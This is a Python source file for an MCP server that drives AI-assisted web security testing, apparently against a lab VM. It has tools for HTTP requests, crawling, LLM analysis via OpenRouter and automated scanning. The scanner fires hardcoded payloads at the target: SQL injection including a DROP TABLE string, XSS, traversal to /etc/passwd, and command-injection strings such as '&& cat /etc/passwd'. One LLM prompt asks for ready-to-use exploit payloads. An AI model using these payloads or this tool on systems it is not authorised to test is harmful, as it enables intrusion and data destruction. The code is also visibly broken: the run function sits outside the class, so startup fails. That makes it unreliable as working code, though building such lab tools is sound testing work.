#!/usr/bin/env python3
"""
MCP Server for AI-powered web security testing using OpenRouter
"""
#from mcp.server.models import NotificationOptions
from mcp.types import ServerCapabilities, NotificationOptions, ExperimentalCapabilities

import asyncio
import json
import logging
from typing import Any, Dict, List, Optional
import aiohttp
import requests
from mcp.server import Server
from mcp.server.models import InitializationOptions
from mcp.server.stdio import stdio_server
from mcp.types import (
    Resource,
    Tool,
    TextContent,
    ImageContent,
    EmbeddedResource,
)
import os
from urllib.parse import urljoin, urlparse
import time
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SecurityTestingMCPServer:
    def __init__(self):
        self.server = Server("security-testing-mcp")
        
        # Load environment variables
        self.openrouter_api_key = os.getenv("OPENROUTER_API_KEY")
        self.target_url = os.getenv("TARGET_URL", "http://192.168.1.100:8080")  # Update with your Proxmox VM IP
        self.session = None
        
        # Debug: Print environment info
        print(f"🔍 Debug Info:")
        print(f"   Current working directory: {os.getcwd()}")
        print(f"   .env file exists: {os.path.exists('.env')}")
        print(f"   TARGET_URL: {self.target_url}")
        print(f"   API Key present: {'Yes' if self.openrouter_api_key else 'No'}")
        
        if not self.openrouter_api_key:
            print("❌ OPENROUTER_API_KEY not found!")
            print("   Please check your .env file contains:")
            print("   OPENROUTER_API_KEY=your_actual_api_key_here")
            raise ValueError("OPENROUTER_API_KEY environment variable is required")
        
        print(f"✅ Environment loaded successfully")
        self.setup_handlers()
    
    def setup_handlers(self):
        """Set up MCP server handlers"""
        
        @self.server.list_resources()
        async def handle_list_resources() -> List[Resource]:
            """List available resources"""
            return [
                Resource(
                    uri="security://target-info",
                    name="Target Application Info",
                    description="Information about the target web application",
                    mimeType="application/json",
                ),
                Resource(
                    uri="security://test-results",
                    name="Security Test Results",
                    description="Results from security tests performed",
                    mimeType="application/json",
                ),
            ]
        
        @self.server.read_resource()
        async def handle_read_resource(uri: str) -> str:
            """Read a specific resource"""
            if uri == "security://target-info":
                return json.dumps({
                    "target_url": self.target_url,
                    "status": "active",
                    "last_checked": time.time()
                })
            elif uri == "security://test-results":
                # This would return stored test results
                return json.dumps({
                    "tests_performed": [],
                    "vulnerabilities_found": [],
                    "last_scan": None
                })
            else:
                raise ValueError(f"Unknown resource: {uri}")
        
        @self.server.list_tools()
        async def handle_list_tools() -> List[Tool]:
            """List available tools"""
            return [
                Tool(
                    name="web_request",
                    description="Make HTTP requests to the target application",
                    inputSchema={
                        "type": "object",
                        "properties": {
                            "method": {
                                "type": "string",
                                "enum": ["GET", "POST", "PUT", "DELETE", "PATCH"],
                                "default": "GET"
                            },
                            "path": {
                                "type": "string",
                                "description": "Path to request (e.g., /login, /admin)"
                            },
                            "headers": {
                                "type": "object",
                                "description": "HTTP headers to include"
                            },
                            "data": {
                                "type": "object",
                                "description": "Request body data"
                            },
                            "params": {
                                "type": "object",
                                "description": "URL parameters"
                            }
                        },
                        "required": ["path"]
                    }
                ),
                Tool(
                    name="analyze_with_ai",
                    description="Analyze web responses or vulnerabilities using AI via OpenRouter",
                    inputSchema={
                        "type": "object",
                        "properties": {
                            "content": {
                                "type": "string",
                                "description": "Content to analyze (HTML, response, etc.)"
                            },
                            "analysis_type": {
                                "type": "string",
                                "enum": ["vulnerability_scan", "response_analysis", "payload_generation"],
                                "description": "Type of analysis to perform"
                            },
                            "model": {
                                "type": "string",
                                "default": "anthropic/claude-3.5-sonnet",
                                "description": "OpenRouter model to use"
                            }
                        },
                        "required": ["content", "analysis_type"]
                    }
                ),
                Tool(
                    name="security_scan",
                    description="Perform automated security scanning of specific endpoints",
                    inputSchema={
                        "type": "object",
                        "properties": {
                            "scan_type": {
                                "type": "string",
                                "enum": ["sql_injection", "xss", "directory_traversal", "command_injection", "authentication_bypass"],
                                "description": "Type of security scan to perform"
                            },
                            "target_path": {
                                "type": "string",
                                "description": "Specific path to scan"
                            },
                            "parameters": {
                                "type": "array",
                                "items": {"type": "string"},
                                "description": "Parameters to test (form fields, URL params, etc.)"
                            }
                        },
                        "required": ["scan_type", "target_path"]
                    }
                ),
                Tool(
                    name="spider_application",
                    description="Crawl the web application to discover endpoints and forms",
                    inputSchema={
                        "type": "object",
                        "properties": {
                            "max_depth": {
                                "type": "integer",
                                "default": 3,
                                "description": "Maximum crawl depth"
                            },
                            "follow_external": {
                                "type": "boolean",
                                "default": False,
                                "description": "Whether to follow external links"
                            }
                        }
                    }
                )
            ]
        
        @self.server.call_tool()
        async def handle_call_tool(name: str, arguments: Dict[str, Any]) -> List[TextContent]:
            """Handle tool calls"""
            try:
                if name == "web_request":
                    return await self.handle_web_request(arguments)
                elif name == "analyze_with_ai":
                    return await self.handle_ai_analysis(arguments)
                elif name == "security_scan":
                    return await self.handle_security_scan(arguments)
                elif name == "spider_application":
                    return await self.handle_spider_application(arguments)
                else:
                    raise ValueError(f"Unknown tool: {name}")
            except Exception as e:
                logger.error(f"Error in tool {name}: {str(e)}")
                return [TextContent(type="text", text=f"Error: {str(e)}")]
    
    async def handle_web_request(self, args: Dict[str, Any]) -> List[TextContent]:
        """Handle web requests to the target application"""
        method = args.get("method", "GET")
        path = args["path"]
        headers = args.get("headers", {})
        data = args.get("data", {})
        params = args.get("params", {})
        
        url = urljoin(self.target_url, path)
        
        try:
            if not self.session:
                self.session = aiohttp.ClientSession()
            
            async with self.session.request(
                method=method,
                url=url,
                headers=headers,
                json=data if method != "GET" else None,
                params=params
            ) as response:
                response_text = await response.text()
                
                result = {
                    "url": str(response.url),
                    "status_code": response.status,
                    "headers": dict(response.headers),
                    "body": response_text[:5000],  # Truncate large responses
                    "method": method
                }
                
                return [TextContent(
                    type="text",
                    text=f"HTTP {method} {url}\nStatus: {response.status}\n\nResponse:\n{json.dumps(result, indent=2)}"
                )]
        
        except Exception as e:
            return [TextContent(type="text", text=f"Request failed: {str(e)}")]
    
    async def handle_ai_analysis(self, args: Dict[str, Any]) -> List[TextContent]:
        """Handle AI analysis via OpenRouter"""
        content = args["content"]
        analysis_type = args["analysis_type"]
        model = args.get("model", "anthropic/claude-3.5-sonnet")
        
        # Create analysis prompt based on type
        prompts = {
            "vulnerability_scan": f"""
Analyze the following web application response for security vulnerabilities:

{content}

Look for:
- SQL injection opportunities
- Cross-site scripting (XSS) vulnerabilities
- Authentication bypasses
- Information disclosure
- Input validation issues
- Directory traversal possibilities

Provide specific findings and potential exploit methods.
""",
            "response_analysis": f"""
Analyze this HTTP response for interesting security-relevant information:

{content}

Focus on:
- Error messages that reveal system information
- Hidden form fields or parameters
- Comments in HTML/JavaScript
- Technology stack indicators
- Potential attack vectors
""",
            "payload_generation": f"""
Based on this web application context, generate security testing payloads:

{content}

Generate payloads for:
- SQL injection testing
- XSS testing
- Command injection testing
- Directory traversal testing

Provide ready-to-use payloads with explanations.
"""
        }
        
        prompt = prompts.get(analysis_type, f"Analyze this content for security issues:\n{content}")
        
        try:
            headers = {
                "Authorization": f"Bearer {self.openrouter_api_key}",
                "Content-Type": "application/json"
            }
            
            payload = {
                "model": model,
                "messages": [
                    {
                        "role": "user",
                        "content": prompt
                    }
                ]
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://openrouter.ai/api/v1/chat/completions",
                    headers=headers,
                    json=payload
                ) as response:
                    result = await response.json()
                    
                    if response.status == 200:
                        ai_response = result["choices"][0]["message"]["content"]
                        return [TextContent(type="text", text=f"AI Analysis ({analysis_type}):\n\n{ai_response}")]
                    else:
                        error_msg = result.get("error", {}).get("message", "Unknown error")
                        return [TextContent(type="text", text=f"OpenRouter API error: {error_msg}")]
        
        except Exception as e:
            return [TextContent(type="text", text=f"AI analysis failed: {str(e)}")]
    
    async def handle_security_scan(self, args: Dict[str, Any]) -> List[TextContent]:
        """Handle automated security scanning"""
        scan_type = args["scan_type"]
        target_path = args["target_path"]
        parameters = args.get("parameters", [])
        
        # Define payloads for different scan types
        payloads = {
            "sql_injection": [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT null, null, null--",
                "admin'--",
                "' OR 1=1#"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<svg onload=alert('XSS')>"
            ],
            "directory_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ],
            "command_injection": [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)"
            ]
        }
        
        scan_payloads = payloads.get(scan_type, [])
        results = []
        
        for payload in scan_payloads:
            # Test each parameter with each payload
            for param in parameters or ['']:
                try:
                    url = urljoin(self.target_url, target_path)
                    
                    if not self.session:
                        self.session = aiohttp.ClientSession()
                    
                    # Try both GET and POST methods
                    for method in ['GET', 'POST']:
                        test_data = {param: payload} if param else {}
                        
                        async with self.session.request(
                            method=method,
                            url=url,
                            params=test_data if method == 'GET' else None,
                            data=test_data if method == 'POST' else None
                        ) as response:
                            response_text = await response.text()
                            
                            # Basic vulnerability detection
                            vulnerable = False
                            if scan_type == "sql_injection":
                                vulnerable = any(indicator in response_text.lower() for indicator in 
                                               ["mysql", "sql syntax", "warning: mysql", "error in your sql"])
                            elif scan_type == "xss":
                                vulnerable = payload in response_text
                            elif scan_type == "directory_traversal":
                                vulnerable = any(indicator in response_text for indicator in 
                                               ["root:", "bin:", "[drivers]", "127.0.0.1"])
                            elif scan_type == "command_injection":
                                vulnerable = any(indicator in response_text for indicator in 
                                               ["uid=", "gid=", "total ", "volume serial number"])
                            
                            if vulnerable or response.status >= 500:
                                results.append({
                                    "method": method,
                                    "parameter": param,
                                    "payload": payload,
                                    "status_code": response.status,
                                    "vulnerable": vulnerable,
                                    "response_snippet": response_text[:500]
                                })
                
                except Exception as e:
                    results.append({
                        "method": "ERROR",
                        "parameter": param,
                        "payload": payload,
                        "error": str(e)
                    })
        
        return [TextContent(
            type="text",
            text=f"Security scan results for {scan_type}:\n\n{json.dumps(results, indent=2)}"
        )]
    
    async def handle_spider_application(self, args: Dict[str, Any]) -> List[TextContent]:
        """Handle web application crawling"""
        max_depth = args.get("max_depth", 3)
        follow_external = args.get("follow_external", False)
        
        discovered_urls = set()
        forms_found = []
        
        async def crawl_url(url: str, depth: int = 0):
            if depth > max_depth or url in discovered_urls:
                return
            
            discovered_urls.add(url)
            
            try:
                if not self.session:
                    self.session = aiohttp.ClientSession()
                
                async with self.session.get(url) as response:
                    if response.content_type and 'text/html' in response.content_type:
                        html_content = await response.text()
                        
                        # Simple link extraction (you might want to use BeautifulSoup here)
                        import re
                        
                        # Find links
                        links = re.findall(r'href=[\'"]([^\'"]*)[\'"]', html_content)
                        for link in links:
                            if link.startswith('http'):
                                if follow_external or link.startswith(self.target_url):
                                    await crawl_url(link, depth + 1)
                            elif link.startswith('/'):
                                await crawl_url(urljoin(self.target_url, link), depth + 1)
                        
                        # Find forms
                        form_matches = re.findall(r'<form[^>]*>(.*?)</form>', html_content, re.DOTALL)
                        for form in form_matches:
                            inputs = re.findall(r'<input[^>]*name=[\'"]([^\'"]*)[\'"][^>]*>', form)
                            action = re.search(r'action=[\'"]([^\'"]*)[\'"]', form)
                            method = re.search(r'method=[\'"]([^\'"]*)[\'"]', form)
                            
                            forms_found.append({
                                "url": url,
                                "action": action.group(1) if action else "",
                                "method": method.group(1) if method else "GET",
                                "inputs": inputs
                            })
            
            except Exception as e:
                logger.error(f"Error crawling {url}: {str(e)}")
        
        await crawl_url(self.target_url)
        
        result = {
            "discovered_urls": list(discovered_urls),
            "forms_found": forms_found,
            "total_urls": len(discovered_urls),
            "total_forms": len(forms_found)
        }
        
        return [TextContent(
            type="text",
            text=f"Spider results:\n\n{json.dumps(result, indent=2)}"
        )]
    
    async def cleanup(self):
        """Clean up resources"""
        if self.session:
            await self.session.close()
    
async def run(self):
    """Run the MCP server"""
    try:
        async with stdio_server() as (read_stream, write_stream):
            await self.server.run(
                read_stream,
                write_stream,
                InitializationOptions(
                    server_name="security-testing-mcp",
                    server_version="1.0.0",
                    capabilities=self.server.get_capabilities(
                        NotificationOptions(),
                        ExperimentalCapabilities()
                    ),
                ),
            )
    finally:
        await self.cleanup()

if __name__ == "__main__":
    server = SecurityTestingMCPServer()
    asyncio.run(server.run())
